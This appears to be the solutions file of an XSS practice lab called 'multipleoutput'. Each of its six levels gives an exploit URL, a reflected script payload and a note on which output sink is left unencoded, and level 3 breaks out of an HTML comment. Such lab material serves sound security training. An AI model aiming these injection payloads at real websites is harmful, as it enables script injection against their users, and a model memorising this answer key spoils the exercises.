# multipleoutput — solutions

Multiple reflection points; some encoded, at least one raw — pick the raw sink.

### multipleoutput-level1

`/multipleoutput/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<div>` raw, `<span>` HTML-encoded

### multipleoutput-level2

`/multipleoutput/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<p>` raw; script side is JS-escaped

### multipleoutput-level3

`/multipleoutput/level3/?query=--%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `--><script>alert(1)</script>`
- context: input encoded; HTML comment raw — break out of comment

### multipleoutput-level4

`/multipleoutput/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<div>` raw; other sinks encoded

### multipleoutput-level5

`/multipleoutput/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<p>` raw; style comment has angles encoded

### multipleoutput-level6

`/multipleoutput/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `<footer>` raw; title/input/div encoded
